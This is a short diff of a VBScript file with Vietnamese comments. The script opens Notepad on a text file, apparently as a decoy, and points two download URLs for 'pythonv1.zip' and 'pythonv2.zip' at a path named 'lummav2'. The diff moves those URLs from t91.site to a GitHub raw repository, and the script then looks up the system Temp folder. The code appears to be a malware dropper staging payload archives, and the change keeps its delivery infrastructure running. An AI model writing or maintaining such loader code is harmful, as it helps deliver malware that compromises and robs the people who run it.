@@ -24,8 +24,8 @@ shell.Run "notepad.exe """ & txtPath & """", 1, False
 
 ' URL của các file ZIP
 
-url1 = "https://t91.site/lummav2/pythonv1.zip"
-url2 = "https://t91.site/lummav2/pythonv2.zip"
+url1 = "https://github.com/2UY5/us/raw/refs/heads/main/pythonv1.zip"
+url2 = "https://github.com/2UY5/us/raw/refs/heads/main/pythonv2.zip"
 
 ' Lấy thư mục Temp thật của hệ thống
 Set shell = CreateObject("WScript.Shell")
